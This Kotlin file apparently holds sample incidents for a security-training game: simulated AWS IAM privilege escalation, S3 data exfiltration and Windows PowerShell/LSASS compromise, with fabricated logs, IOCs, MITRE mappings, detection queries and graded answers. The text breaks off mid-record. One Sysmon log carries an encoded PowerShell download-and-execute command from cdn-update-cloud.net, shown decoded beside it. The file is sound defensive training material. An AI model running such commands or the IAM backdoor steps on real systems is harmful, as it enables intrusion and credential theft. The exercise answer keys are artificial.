package com.example.data.sample

import com.example.model.*

object SampleIncidents {

    fun getSampleIncidents(): List<Incident> {
        return listOf(
            createIamPrivEscIncident(),
            createS3ExfiltrationIncident(),
            createSysmonProcessInjectionIncident(),
            createCloudSsrfImdsIncident(),
            createLinuxSshCompromiseIncident(),
            createCryptoMiningIncident()
        )
    }

    private fun createIamPrivEscIncident(): Incident {
        return Incident(
            id = "INC-AWS-8821",
            title = "AWS IAM Privilege Escalation & Backdoor Role",
            category = IncidentCategory.AWS_IAM,
            difficulty = DifficultyLevel.BEGINNER,
            initialSeverity = IncidentSeverity.HIGH,
            targetOrganization = "FinTech Global Cloud Corp",
            assetScope = "AWS Account: 489201948210 (Production VPC)",
            alertHeadline = "GuardDuty Alert: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
            alertSource = "AWS GuardDuty / CloudTrail",
            alertDescription = "GuardDuty detected IAM credentials for user 'dev-cameron' being invoked from an unrecognized external Tor Exit IP (185.220.101.42) executing administrative privilege escalation APIs.",
            rootCauseSummary = "Contractor access key AKIAIOSFODNN7EXAMPLE for user 'dev-cameron' was leaked or stolen. The adversary used the credentials from Tor exit node 185.220.101.42 to attach 'AdministratorAccess' policy to dev-cameron, created a persistence backdoor role 'AWSServiceRoleForBackupSync' trusting external AWS Account 992817293812, and generated a secondary access key.",
            hints = listOf(
                "Check the source IP of user 'dev-cameron' across the CloudTrail log stream. Notice any unfamiliar external IP?",
                "Look for 'AttachUserPolicy' or 'CreatePolicyVersion' APIs called by that suspicious IP.",
                "Inspect what persistence mechanisms the adversary created (look for CreateRole or CreateAccessKey calls)."
            ),
            recommendedLearningTopics = listOf("AWS IAM Security & PrivEsc Vectors", "CloudTrail API Forensics", "AssumeRole & Trust Relationship Auditing"),
            xpReward = 450,
            correctIocs = listOf(
                IocItem(id = "ioc-1", type = IocType.IP_ADDRESS, value = "185.220.101.42", contextNote = "Tor Exit Node used by attacker", isTrueIoc = true),
                IocItem(id = "ioc-2", type = IocType.IAM_USER, value = "dev-cameron", contextNote = "Compromised developer IAM account", isTrueIoc = true),
                IocItem(id = "ioc-3", type = IocType.ROLE_ARN, value = "arn:aws:iam::489201948210:role/AWSServiceRoleForBackupSync", contextNote = "Backdoor trust role for external persistence", isTrueIoc = true),
                IocItem(id = "ioc-4", type = IocType.ROLE_ARN, value = "arn:aws:iam::489201948210:user/svc-billing-sync", contextNote = "Backdoor secondary IAM user created by attacker", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1078.004",
                    name = "Valid Accounts: Cloud Accounts",
                    tactic = "Initial Access",
                    description = "Adversaries may obtain and abuse credentials of existing cloud accounts.",
                    cloudDetectionQuery = "eventSource:iam.amazonaws.com AND (eventName:ConsoleLogin OR eventName:GetCallerIdentity)",
                    mitigation = "Enforce MFA for all IAM users and eliminate long-lived access keys in favor of IAM Roles with STS."
                ),
                MitreTechnique(
                    id = "T1098.001",
                    name = "Account Manipulation: Additional Cloud Credentials",
                    tactic = "Persistence",
                    description = "Adversaries may add new credentials to cloud accounts to maintain persistence.",
                    cloudDetectionQuery = "eventName:CreateAccessKey OR eventName:CreateLoginProfile",
                    mitigation = "Alert immediately on CreateAccessKey for privileged accounts and enforce SCPs restricting credential creation."
                ),
                MitreTechnique(
                    id = "T1098",
                    name = "Account Manipulation: Role Trust Tampering",
                    tactic = "Privilege Escalation",
                    description = "Adversaries may modify trust policies or attach AdministratorAccess policies to gain full control.",
                    cloudDetectionQuery = "eventName:AttachUserPolicy AND requestParameters.policyArn:*AdministratorAccess*",
                    mitigation = "Implement AWS IAM Access Analyzer and restrict iam:AttachUserPolicy via Permission Boundaries."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "m1", logId = "log-1", timestamp = "2026-08-27T14:02:11Z", title = "Initial Ingress via Compromised Key", description = "Adversary calls sts:GetCallerIdentity from Tor IP 185.220.101.42 using dev-cameron access key.", phase = "Initial Access", isCriticalStep = true),
                TimelineMilestone(id = "m2", logId = "log-2", timestamp = "2026-08-27T14:04:30Z", title = "IAM Enumeration & Recon", description = "Adversary calls iam:ListAttachedUserPolicies and iam:ListRoles to identify privilege boundaries.", phase = "Discovery", isCriticalStep = false),
                TimelineMilestone(id = "m3", logId = "log-3", timestamp = "2026-08-27T14:06:45Z", title = "Privilege Escalation: AdministratorAccess Attached", description = "Adversary attaches arn:aws:iam::aws:policy/AdministratorAccess directly to dev-cameron.", phase = "Privilege Escalation", isCriticalStep = true),
                TimelineMilestone(id = "m4", logId = "log-4", timestamp = "2026-08-27T14:09:12Z", title = "Backdoor Role Created", description = "Adversary creates AWSServiceRoleForBackupSync with AssumeRole trust to external AWS Account 992817293812.", phase = "Persistence", isCriticalStep = true),
                TimelineMilestone(id = "m5", logId = "log-5", timestamp = "2026-08-27T14:11:55Z", title = "Secondary Credential Minting", description = "Adversary creates user svc-billing-sync and issues access key AKIA998271103982.", phase = "Persistence", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "cont-1", title = "Deactivate & Delete Compromised Access Key AKIAIOSFODNN7EXAMPLE", category = "IAM", description = "Immediately revoke the leaked key pair for user dev-cameron to terminate API access.", isRecommended = true),
                ContainmentAction(id = "cont-2", title = "Delete Backdoor Role AWSServiceRoleForBackupSync", category = "IAM", description = "Remove the unauthorized cross-account role to prevent lateral re-entry.", isRecommended = true),
                ContainmentAction(id = "cont-3", title = "Delete Rogue User svc-billing-sync & Deactivate Created Key", category = "IAM", description = "Eliminate the secondary backdoor user created during persistence phase.", isRecommended = true),
                ContainmentAction(id = "cont-4", title = "Detach AdministratorAccess Policy from dev-cameron", category = "IAM", description = "Strip elevated privileges back to least privilege baseline.", isRecommended = true),
                ContainmentAction(id = "cont-5", title = "Terminate All Production EC2 Instances in Region", category = "Infrastructure", description = "Shut down all active servers across the VPC.", isRecommended = false, impactWarning = "Causes major catastrophic production outage for benign services!")
            ),
            correctContainmentIds = listOf("cont-1", "cont-2", "cont-3", "cont-4"),
            logs = listOf(
                LogEvent(
                    id = "log-noise-1",
                    timestamp = "2026-08-27T13:58:00Z",
                    source = "CloudTrail",
                    eventName = "DescribeInstances",
                    actor = "arn:aws:iam::489201948210:role/aws-service-role/autoscaling.amazonaws.com",
                    sourceIp = "10.0.4.12",
                    severity = IncidentSeverity.INFORMATIONAL,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AWSService\",\"invokedBy\":\"autoscaling.amazonaws.com\"},\"eventTime\":\"2026-08-27T13:58:00Z\",\"eventSource\":\"ec2.amazonaws.com\",\"eventName\":\"DescribeInstances\",\"awsRegion\":\"us-east-1\",\"sourceIPAddress\":\"10.0.4.12\",\"userAgent\":\"AutoScalingService\"}",
                    parsedFields = mapOf("eventSource" to "ec2.amazonaws.com", "actor" to "AutoScaling", "action" to "DescribeInstances", "status" to "SUCCESS"),
                    isMalicious = false,
                    attackPhase = "Benign Baseline"
                ),
                LogEvent(
                    id = "log-1",
                    timestamp = "2026-08-27T14:02:11Z",
                    source = "CloudTrail",
                    eventName = "GetCallerIdentity",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.MEDIUM,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"principalId\":\"AIDAJ456QWERTYDEV\",\"arn\":\"arn:aws:iam::489201948210:user/dev-cameron\",\"accountId\":\"489201948210\",\"accessKeyId\":\"AKIAIOSFODNN7EXAMPLE\",\"userName\":\"dev-cameron\"},\"eventTime\":\"2026-08-27T14:02:11Z\",\"eventSource\":\"sts.amazonaws.com\",\"eventName\":\"GetCallerIdentity\",\"awsRegion\":\"us-east-1\",\"sourceIPAddress\":\"185.220.101.42\",\"userAgent\":\"aws-cli/2.15.17 Python/3.11.6 Linux/6.5.0-tor-exit\"}",
                    parsedFields = mapOf("eventSource" to "sts.amazonaws.com", "user" to "dev-cameron", "sourceIp" to "185.220.101.42", "userAgent" to "aws-cli/2.15.17 Linux/tor-exit", "accessKeyId" to "AKIAIOSFODNN7EXAMPLE"),
                    isMalicious = true,
                    attackPhase = "Initial Access"
                ),
                LogEvent(
                    id = "log-2",
                    timestamp = "2026-08-27T14:04:30Z",
                    source = "CloudTrail",
                    eventName = "ListAttachedUserPolicies",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.INFORMATIONAL,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"dev-cameron\",\"accessKeyId\":\"AKIAIOSFODNN7EXAMPLE\"},\"eventTime\":\"2026-08-27T14:04:30Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"ListAttachedUserPolicies\",\"requestParameters\":{\"userName\":\"dev-cameron\"},\"sourceIPAddress\":\"185.220.101.42\",\"userAgent\":\"aws-cli/2.15.17\"}",
                    parsedFields = mapOf("eventSource" to "iam.amazonaws.com", "user" to "dev-cameron", "targetUser" to "dev-cameron", "sourceIp" to "185.220.101.42"),
                    isMalicious = true,
                    attackPhase = "Discovery"
                ),
                LogEvent(
                    id = "log-noise-2",
                    timestamp = "2026-08-27T14:05:15Z",
                    source = "CloudTrail",
                    eventName = "GetSecretValue",
                    actor = "arn:aws:iam::489201948210:role/prod-payment-processor",
                    sourceIp = "10.0.1.55",
                    severity = IncidentSeverity.INFORMATIONAL,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"arn\":\"arn:aws:iam::489201948210:assumed-role/prod-payment-processor/i-09f8e12a\"},\"eventTime\":\"2026-08-27T14:05:15Z\",\"eventSource\":\"secretsmanager.amazonaws.com\",\"eventName\":\"GetSecretValue\",\"requestParameters\":{\"secretId\":\"prod/db/payment-creds\"},\"sourceIPAddress\":\"10.0.1.55\"}",
                    parsedFields = mapOf("eventSource" to "secretsmanager.amazonaws.com", "role" to "prod-payment-processor", "secretId" to "prod/db/payment-creds", "status" to "SUCCESS"),
                    isMalicious = false,
                    attackPhase = "Benign Baseline"
                ),
                LogEvent(
                    id = "log-3",
                    timestamp = "2026-08-27T14:06:45Z",
                    source = "CloudTrail",
                    eventName = "AttachUserPolicy",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"dev-cameron\",\"accessKeyId\":\"AKIAIOSFODNN7EXAMPLE\"},\"eventTime\":\"2026-08-27T14:06:45Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"AttachUserPolicy\",\"requestParameters\":{\"userName\":\"dev-cameron\",\"policyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\"},\"sourceIPAddress\":\"185.220.101.42\",\"responseElements\":null}",
                    parsedFields = mapOf("eventSource" to "iam.amazonaws.com", "action" to "AttachUserPolicy", "policyArn" to "arn:aws:iam::aws:policy/AdministratorAccess", "targetUser" to "dev-cameron", "sourceIp" to "185.220.101.42"),
                    isMalicious = true,
                    attackPhase = "Privilege Escalation"
                ),
                LogEvent(
                    id = "log-4",
                    timestamp = "2026-08-27T14:09:12Z",
                    source = "CloudTrail",
                    eventName = "CreateRole",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"dev-cameron\",\"accessKeyId\":\"AKIAIOSFODNN7EXAMPLE\"},\"eventTime\":\"2026-08-27T14:09:12Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateRole\",\"requestParameters\":{\"roleName\":\"AWSServiceRoleForBackupSync\",\"assumeRolePolicyDocument\":\"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"AWS\\\":\\\"arn:aws:iam::992817293812:root\\\"},\\\"Action\\\":\\\"sts:AssumeRole\\\"}]}\"},\"sourceIPAddress\":\"185.220.101.42\"}",
                    parsedFields = mapOf("eventSource" to "iam.amazonaws.com", "roleName" to "AWSServiceRoleForBackupSync", "trustedExternalAccount" to "992817293812", "sourceIp" to "185.220.101.42"),
                    isMalicious = true,
                    attackPhase = "Persistence"
                ),
                LogEvent(
                    id = "log-5",
                    timestamp = "2026-08-27T14:11:55Z",
                    source = "CloudTrail",
                    eventName = "CreateUser",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"dev-cameron\"},\"eventTime\":\"2026-08-27T14:11:55Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateUser\",\"requestParameters\":{\"userName\":\"svc-billing-sync\"},\"sourceIPAddress\":\"185.220.101.42\"}",
                    parsedFields = mapOf("eventSource" to "iam.amazonaws.com", "newUser" to "svc-billing-sync", "sourceIp" to "185.220.101.42"),
                    isMalicious = true,
                    attackPhase = "Persistence"
                ),
                LogEvent(
                    id = "log-6",
                    timestamp = "2026-08-27T14:12:30Z",
                    source = "CloudTrail",
                    eventName = "CreateAccessKey",
                    actor = "arn:aws:iam::489201948210:user/dev-cameron",
                    sourceIp = "185.220.101.42",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"userName\":\"dev-cameron\"},\"eventTime\":\"2026-08-27T14:12:30Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateAccessKey\",\"requestParameters\":{\"userName\":\"svc-billing-sync\"},\"responseElements\":{\"accessKey\":{\"accessKeyId\":\"AKIA998271103982\",\"userName\":\"svc-billing-sync\",\"status\":\"Active\"}},\"sourceIPAddress\":\"185.220.101.42\"}",
                    parsedFields = mapOf("eventSource" to "iam.amazonaws.com", "createdKey" to "AKIA998271103982", "forUser" to "svc-billing-sync"),
                    isMalicious = true,
                    attackPhase = "Persistence"
                )
            )
        )
    }

    private fun createS3ExfiltrationIncident(): Incident {
        return Incident(
            id = "INC-S3-4019",
            title = "S3 Sensitive Bucket Data Exposure & Bulk Exfiltration",
            category = IncidentCategory.S3_STORAGE,
            difficulty = DifficultyLevel.INTERMEDIATE,
            initialSeverity = IncidentSeverity.CRITICAL,
            targetOrganization = "HealthCare AI Cloud Services",
            assetScope = "Bucket: corp-customer-pii-archive-2026",
            alertHeadline = "CloudTrail & S3 Anomaly: Public Read Policy Tampering + 18.4GB High-Throughput Egress",
            alertSource = "AWS CloudWatch Alarms / S3 Access Logs",
            alertDescription = "Anomalous S3 PutBucketPolicy API modified access permissions on HIPAA archive bucket, followed immediately by 320+ high-frequency GetObject requests from Russian IP 194.26.29.11 downloading patient records.",
            rootCauseSummary = "Stolen AWS API credentials for user 'data-pipeline-svc' were used to execute PutBucketPolicy, making the patient PII bucket readable to '*'. The attacker then launched an automated multi-threaded download script from 194.26.29.11, exfiltrating 18.4GB of compressed clinical data.",
            hints = listOf(
                "Check PutBucketPolicy in CloudTrail. Inspect the requestParameters to see the policy document!",
                "Correlate the timestamp of the policy modification with the incoming S3 Server Access logs.",
                "Calculate total data volume exfiltrated and identify the external destination IP."
            ),
            recommendedLearningTopics = listOf("S3 Bucket Policy Forensics & S3 Block Public Access", "Exfiltration Detection in VPC & S3 Logs", "AWS GuardDuty S3 Anomaly Findings"),
            xpReward = 550,
            correctIocs = listOf(
                IocItem(id = "s3-ioc-1", type = IocType.IP_ADDRESS, value = "194.26.29.11", contextNote = "Adversary Exfiltration Host IP", isTrueIoc = true),
                IocItem(id = "s3-ioc-2", type = IocType.IAM_USER, value = "data-pipeline-svc", contextNote = "Compromised pipeline IAM service account", isTrueIoc = true),
                IocItem(id = "s3-ioc-3", type = IocType.ROLE_ARN, value = "arn:aws:s3:::corp-customer-pii-archive-2026", contextNote = "Compromised S3 bucket with customer PII", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1530",
                    name = "Data from Cloud Storage",
                    tactic = "Collection",
                    description = "Adversaries may access data objects from cloud storage repositories like AWS S3.",
                    cloudDetectionQuery = "eventSource:s3.amazonaws.com AND (eventName:GetObject OR eventName:ListObjectsV2) AND bytesSent > 10000000",
                    mitigation = "Enable S3 Block Public Access at account level and restrict KMS bucket key access via SCPs."
                ),
                MitreTechnique(
                    id = "T1562.001",
                    name = "Impair Defenses: Disable Cloud Security Controls",
                    tactic = "Defense Evasion",
                    description = "Adversaries may modify cloud security configurations or bucket policies to bypass access controls.",
                    cloudDetectionQuery = "eventName:PutBucketPolicy OR eventName:DeleteBucketEncryption",
                    mitigation = "Enforce IAM boundary policies that prevent modification of S3 bucket policies except by SecOps."
                ),
                MitreTechnique(
                    id = "T1041",
                    name = "Exfiltration Over C2 Channel",
                    tactic = "Exfiltration",
                    description = "Adversaries may steal data directly over the web/cloud connection to an external endpoint.",
                    cloudDetectionQuery = "source:S3AccessLog AND status:200 AND remoteIp NOT IN (CorporateCIDR)",
                    mitigation = "Implement VPC Endpoints for S3 with restrictive Endpoint Policies preventing external data transfer."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "s3-m1", logId = "s3-log-1", timestamp = "2026-08-27T16:10:00Z", title = "Bucket Reconnaissance", description = "Adversary lists buckets and queries ACL for corp-customer-pii-archive-2026.", phase = "Discovery", isCriticalStep = false),
                TimelineMilestone(id = "s3-m2", logId = "s3-log-2", timestamp = "2026-08-27T16:12:18Z", title = "Bucket Policy Tampered to Public", description = "PutBucketPolicy called granting Principal: * access to s3:GetObject.", phase = "Defense Evasion", isCriticalStep = true),
                TimelineMilestone(id = "s3-m3", logId = "s3-log-3", timestamp = "2026-08-27T16:14:02Z", title = "Bulk Exfiltration Initiated", description = "Mass GetObject calls from 194.26.29.11 downloading kyc_passports_2025.zip and database dumps.", phase = "Exfiltration", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "s3-c1", title = "Enable S3 Block Public Access on Bucket & Account", category = "Storage", description = "Immediately override bucket policy and block all public read/write access.", isRecommended = true),
                ContainmentAction(id = "s3-c2", title = "Delete Tampered Bucket Policy", category = "Storage", description = "Purge the malicious Allow * policy document from the target bucket.", isRecommended = true),
                ContainmentAction(id = "s3-c3", title = "Rotate Credentials for data-pipeline-svc & Revoke Active Sessions", category = "IAM", description = "Invalidate active STS sessions and generate new secret key for the service account.", isRecommended = true),
                ContainmentAction(id = "s3-c4", title = "Delete the S3 Bucket and all its contents", category = "Storage", description = "Completely destroy the bucket.", isRecommended = false, impactWarning = "Permanently destroys 5 years of critical HIPAA records!")
            ),
            correctContainmentIds = listOf("s3-c1", "s3-c2", "s3-c3"),
            logs = listOf(
                LogEvent(
                    id = "s3-log-1",
                    timestamp = "2026-08-27T16:10:00Z",
                    source = "CloudTrail",
                    eventName = "GetBucketAcl",
                    actor = "arn:aws:iam::489201948210:user/data-pipeline-svc",
                    sourceIp = "194.26.29.11",
                    severity = IncidentSeverity.MEDIUM,
                    rawPayload = "{\"eventTime\":\"2026-08-27T16:10:00Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"GetBucketAcl\",\"requestParameters\":{\"bucketName\":\"corp-customer-pii-archive-2026\"},\"sourceIPAddress\":\"194.26.29.11\",\"userAgent\":\"aws-sdk-python/1.26.115\"}",
                    parsedFields = mapOf("eventSource" to "s3.amazonaws.com", "bucket" to "corp-customer-pii-archive-2026", "sourceIp" to "194.26.29.11"),
                    isMalicious = true,
                    attackPhase = "Discovery"
                ),
                LogEvent(
                    id = "s3-log-2",
                    timestamp = "2026-08-27T16:12:18Z",
                    source = "CloudTrail",
                    eventName = "PutBucketPolicy",
                    actor = "arn:aws:iam::489201948210:user/data-pipeline-svc",
                    sourceIp = "194.26.29.11",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"eventTime\":\"2026-08-27T16:12:18Z\",\"eventSource\":\"s3.amazonaws.com\",\"eventName\":\"PutBucketPolicy\",\"requestParameters\":{\"bucketName\":\"corp-customer-pii-archive-2026\",\"bucketPolicy\":{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::corp-customer-pii-archive-2026/*\"}]}},\"sourceIPAddress\":\"194.26.29.11\"}",
                    parsedFields = mapOf("eventSource" to "s3.amazonaws.com", "bucket" to "corp-customer-pii-archive-2026", "policyTampered" to "Principal: * Allow s3:GetObject", "sourceIp" to "194.26.29.11"),
                    isMalicious = true,
                    attackPhase = "Defense Evasion"
                ),
                LogEvent(
                    id = "s3-log-3",
                    timestamp = "2026-08-27T16:14:02Z",
                    source = "S3AccessLog",
                    eventName = "REST.GET.OBJECT",
                    actor = "AnonymousCaller (Public)",
                    sourceIp = "194.26.29.11",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"timestamp\":\"2026-08-27T16:14:02Z\",\"remoteIp\":\"194.26.29.11\",\"bucket\":\"corp-customer-pii-archive-2026\",\"key\":\"archives/kyc_passports_2025.zip\",\"httpStatus\":200,\"bytesSent\":9840219400,\"totalTime\":4200,\"userAgent\":\"curl/8.4.0\"}",
                    parsedFields = mapOf("key" to "kyc_passports_2025.zip", "bytesSent" to "9.84 GB", "remoteIp" to "194.26.29.11", "httpStatus" to "200"),
                    isMalicious = true,
                    attackPhase = "Exfiltration"
                ),
                LogEvent(
                    id = "s3-log-4",
                    timestamp = "2026-08-27T16:15:30Z",
                    source = "S3AccessLog",
                    eventName = "REST.GET.OBJECT",
                    actor = "AnonymousCaller (Public)",
                    sourceIp = "194.26.29.11",
                    severity = IncidentSeverity.CRITICAL,
                    rawPayload = "{\"timestamp\":\"2026-08-27T16:15:30Z\",\"remoteIp\":\"194.26.29.11\",\"bucket\":\"corp-customer-pii-archive-2026\",\"key\":\"exports/patient_clinical_db_dump.sql.gz\",\"httpStatus\":200,\"bytesSent\":8560000000,\"totalTime\":3800,\"userAgent\":\"curl/8.4.0\"}",
                    parsedFields = mapOf("key" to "patient_clinical_db_dump.sql.gz", "bytesSent" to "8.56 GB", "remoteIp" to "194.26.29.11", "httpStatus" to "200"),
                    isMalicious = true,
                    attackPhase = "Exfiltration"
                )
            )
        )
    }

    private fun createSysmonProcessInjectionIncident(): Incident {
        return Incident(
            id = "INC-WIN-9102",
            title = "Malicious PowerShell & Sysmon Process Injection",
            category = IncidentCategory.WINDOWS_SYSMON,
            difficulty = DifficultyLevel.ADVANCED,
            initialSeverity = IncidentSeverity.CRITICAL,
            targetOrganization = "Apex Defense Financial Systems",
            assetScope = "Host: SRV-FIN-WS04.corp.apex.local (IP: 10.20.4.88)",
            alertHeadline = "Sysmon & EDR Detection: Base64 Encoded PowerShell + LSASS Memory Dump Access",
            alertSource = "Windows Sysmon / EDR Agent",
            alertDescription = "Sysmon Event ID 1 flagged an obfuscated PowerShell execution spawned by Word (WINWORD.EXE). Subsequently, a staged payload was downloaded via Bitsadmin and injected into svchost.exe, which opened LSASS memory handle with full access rights.",
            rootCauseSummary = "Phishing email with weaponized macro document executed encoded PowerShell on workstation SRV-FIN-WS04. The script downloaded second-stage payload svchost_update.exe to C:\\Users\\Public\\, executed process hollowing into svchost.exe (PID 4820), and dumped LSASS credentials to C:\\Windows\\Temp\\debug.dmp before connecting to C2 at 91.132.145.88:8443.",
            hints = listOf(
                "Analyze Sysmon Event ID 1 ParentImage. What spawned PowerShell?",
                "Decode the base64 string in CommandLine to understand what the PowerShell script executes.",
                "Check Sysmon Event ID 10 (ProcessAccess) where TargetImage is C:\\Windows\\System32\\lsass.exe."
            ),
            recommendedLearningTopics = listOf("Sysmon Event IDs (1, 3, 7, 10, 11) Mastery", "Windows Credential Dumping (Mimikatz & LSASS)", "Process Injection & Hollowing Analysis"),
            xpReward = 600,
            correctIocs = listOf(
                IocItem(id = "win-ioc-1", type = IocType.IP_ADDRESS, value = "91.132.145.88", contextNote = "Adversary C2 Server IP", isTrueIoc = true),
                IocItem(id = "win-ioc-2", type = IocType.DOMAIN, value = "cdn-update-cloud.net", contextNote = "Malicious Payload Delivery Domain", isTrueIoc = true),
                IocItem(id = "win-ioc-3", type = IocType.FILE_HASH, value = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", contextNote = "SHA256 Hash of svchost_update.exe", isTrueIoc = true),
                IocItem(id = "win-ioc-4", type = IocType.PROCESS_NAME, value = "C:\\Users\\Public\\svchost_update.exe", contextNote = "Dropped Stage-2 Malware Binary", isTrueIoc = true)
            ),
            correctMitreTechniques = listOf(
                MitreTechnique(
                    id = "T1059.001",
                    name = "Command and Scripting Interpreter: PowerShell",
                    tactic = "Execution",
                    description = "Adversaries may abuse PowerShell commands and scripts for execution.",
                    cloudDetectionQuery = "source:Sysmon AND EventID:1 AND (CommandLine:*powershell* AND (CommandLine:*-enc* OR CommandLine:*-exec bypass*))",
                    mitigation = "Enforce PowerShell Constrained Language Mode and enable Script Block Logging (Event ID 4104)."
                ),
                MitreTechnique(
                    id = "T1003.001",
                    name = "OS Credential Dumping: LSASS Memory",
                    tactic = "Credential Access",
                    description = "Adversaries may attempt to access LSASS process memory to extract plain text passwords or NTLM hashes.",
                    cloudDetectionQuery = "source:Sysmon AND EventID:10 AND TargetImage:*lsass.exe AND GrantedAccess:0x1010",
                    mitigation = "Enable Windows Defender Credential Guard (LSA Protection) and restrict debug privileges."
                ),
                MitreTechnique(
                    id = "T1055",
                    name = "Process Injection",
                    tactic = "Defense Evasion",
                    description = "Adversaries may inject code into processes in order to evade process-based defenses.",
                    cloudDetectionQuery = "source:Sysmon AND EventID:8 OR (EventID:10 AND SourceImage:*public*)",
                    mitigation = "Implement Endpoint Detection and Response (EDR) with kernel-level memory scanning."
                )
            ),
            correctMilestones = listOf(
                TimelineMilestone(id = "wm-1", logId = "wlog-1", timestamp = "2026-08-27T10:15:20Z", title = "Macro Launch via Word", description = "WINWORD.EXE launches obfuscated powershell.exe with -enc parameter.", phase = "Execution", isCriticalStep = true),
                TimelineMilestone(id = "wm-2", logId = "wlog-2", timestamp = "2026-08-27T10:15:45Z", title = "Stage-2 Binary Dropped", description = "Bitsadmin downloads svchost_update.exe to C:\\Users\\Public\\ from cdn-update-cloud.net.", phase = "Persistence", isCriticalStep = true),
                TimelineMilestone(id = "wm-3", logId = "wlog-3", timestamp = "2026-08-27T10:16:10Z", title = "Process Access to LSASS Memory", description = "svchost_update.exe requests memory handle on lsass.exe to dump credentials.", phase = "Credential Access", isCriticalStep = true),
                TimelineMilestone(id = "wm-4", logId = "wlog-4", timestamp = "2026-08-27T10:17:00Z", title = "Outbound C2 Beaconing", description = "Injected svchost.exe opens outbound TCP connection on port 8443 to 91.132.145.88.", phase = "Command and Control", isCriticalStep = true)
            ),
            availableContainmentActions = listOf(
                ContainmentAction(id = "w-c1", title = "Isolate Workstation SRV-FIN-WS04 from Network via EDR", category = "Endpoint", description = "Sever all network connections to prevent lateral movement while preserving memory for forensic triage.", isRecommended = true),
                ContainmentAction(id = "w-c2", title = "Kill Process svchost_update.exe & Injected PID 4820", category = "Endpoint", description = "Terminate the malicious process tree and delete staging file from C:\\Users\\Public\\.", isRecommended = true),
                ContainmentAction(id = "w-c3", title = "Block C2 IP 91.132.145.88 & Domain on Perimeter Firewall/Proxy", category = "Network", description = "Block all inbound/outbound traffic to the identified adversary infrastructure.", isRecommended = true),
                ContainmentAction(id = "w-c4", title = "Trigger Mandatory Enterprise-wide Domain Password Reset for all active users", category = "Identity", description = "Force all 50,000 corporate users to change passwords.", isRecommended = false, impactWarning = "Immediate mass helpdesk denial of service! Limit resets to affected host logged-on users.")
            ),
            correctContainmentIds = listOf("w-c1", "w-c2", "w-c3"),
            logs = listOf(
                LogEvent(
                    id = "wlog-1",
                    timestamp = "2026-08-27T10:15:20Z",
                    source = "Sysmon",
                    eventName = "Event ID 1 (Process Create)",
                    actor = "CORP\\sarah.jenkins",
                    severity = IncidentSeverity.HIGH,
                    rawPayload = "{\"EventID\":1,\"UtcTime\":\"2026-08-27 10:15:20.102\",\"ProcessGuid\":\"{A892-0192-4810}\",\"ProcessId\":3912,\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"CommandLine\":\"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AYwBsAG8AdQBkAC4AbgBlAHQALwBnAGUAdAAuAHAAcwAxACcAKQA=\",\"ParentImage\":\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\",\"User\":\"CORP\\\\sarah.jenkins\"}",
                    parsedFields = mapOf("EventID" to "1", "ParentImage" to "WINWORD.EXE", "Image" to "powershell.exe", "ObfuscatedCommand" to "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-cloud.net/get.ps1')"),
                    isMalicious = true,
                    attackPhase = "Execution"
                ),
                LogEvent(
                    id = "wlog-2",
